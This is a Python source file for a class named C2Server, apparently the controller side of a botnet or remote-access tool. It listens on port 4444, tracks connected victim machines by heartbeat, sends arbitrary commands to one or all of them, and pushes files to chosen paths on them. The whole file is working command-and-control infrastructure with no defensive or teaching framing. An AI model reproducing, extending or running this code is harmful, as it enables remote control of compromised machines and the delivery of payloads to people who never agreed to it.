import socket
import threading
import time

from server_core.logging import Logger
from server_core.heartbeat import heartbeat_sender
from server_core.acceptor import accept_loop


class C2Server:
    def __init__(self, host='0.0.0.0', command_port=4444, heartbeat_port=4445):
        self.host = host
        self.command_port = command_port
        self.heartbeat_port = heartbeat_port

        self.clients = {}
        self.lock = threading.Lock()
        self.running = True

        self.heartbeat_interval = 10
        self.client_retention = 3600

        self.logger = Logger(lambda: self.running)

    def log(self, msg):
        self.logger.log(msg)

    def start(self, ui):
        if not getattr(ui, "handles_logs", False):
            threading.Thread(target=self.logger.printer, daemon=True).start()
            
        threading.Thread(target=heartbeat_sender, args=(self,), daemon=True).start()

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.command_port))
        server.listen(50)

        self.log(f"[*] Server listening on {self.command_port}")

        threading.Thread(
            target=accept_loop,
            args=(self, server),
            daemon=True
        ).start()

        ui.run(self)

        return server

    def stop(self):
        self.running = False
        with self.lock:
            for c in self.clients.values():
                c.close()

    # ---------------- COMMANDS ----------------
    def broadcast_command(self, command):
        with self.lock:
            clients = list(self.clients.values())

        for client in clients:
            with client.lock:
                if not client.active:
                    continue
                try:
                    client.socket.send((command + '\n').encode())
                    client.set_time(time.time())
                except Exception as e:
                    self.log(f"[!] Send failed to {client.ip}: {e}")
                    client.close()

    def client_command(self, uid_prefix, command):
        target = self.find_client_by_prefix(uid_prefix)

        if not target:
            self.log("[ERR] Client not found or ambiguous")
            return

        with target.lock:
            try:
                target.socket.send((command + '\n').encode())
                target.set_time(time.time())
            except Exception:
                target.close()

    def find_client_by_prefix(self, uid_prefix):
        with self.lock:
            matches = [
                c for uid, c in self.clients.items()
                if uid.startswith(uid_prefix)
            ]
        if len(matches) == 1:
            return matches[0]
        return None

    def push_file_to_client(self, uid_prefix, source_path, dest_path):
        target = self.find_client_by_prefix(uid_prefix)
        if not target:
            self.log(f"[ERR] Client not found or ambiguous: {uid_prefix}")
            return

        try:
            with open(source_path, 'rb') as f:
                content = f.read()
        except FileNotFoundError:
            self.log(f"[ERR] File not found: {source_path}")
            return
        except Exception as e:
            self.log(f"[ERR] Error reading file {source_path}: {e}")
            return

        command = f"PUSH|{dest_path}|{len(content)}\n".encode() + content

        with target.lock:
            try:
                target.socket.sendall(command)
                target.set_time(time.time())
                self.log(f"Sent {source_path} to {target.unique_id[:8]}...")
            except Exception as e:
                self.log(f"[ERR] Failed to send file to {target.unique_id[:8]}: {e}")
                target.close()

    def push_file_to_all_clients(self, source_path, dest_path):
        try:
            with open(source_path, 'rb') as f:
                content = f.read()
        except FileNotFoundError:
            self.log(f"[ERR] File not found: {source_path}")
            return
        except Exception as e:
            self.log(f"[ERR] Error reading file {source_path}: {e}")
            return

        command = f"PUSH|{dest_path}|{len(content)}\n".encode() + content

        with self.lock:
            clients = list(self.clients.values())

        for client in clients:
            with client.lock:
                if not client.active:
                    continue
                try:
                    client.socket.sendall(command)
                    client.set_time(time.time())
                    self.log(f"Sent {source_path} to {client.unique_id[:8]}...")
                except Exception as e:
                    self.log(f"[ERR] Failed to send file to {client.unique_id[:8]}: {e}")
                    client.close()


    def list_command(self):
        with self.lock:
            clients = self.clients.values()
            if not clients:
                self.log("No clients registered")
                return
            
            self.log("Clients:")
            for client in clients:
                with client.lock:
                    state = "ACTIVE" if client.active else "INACTIVE"
                    idle = int(time.time() - client.last_seen)
                    self.log(
                        f"{client.unique_id} -> {client.ip}:{client.port} "
                        f"State: {state}; idle:{idle}s; HeartBeat port:{client.heartbeat_port}"
                    )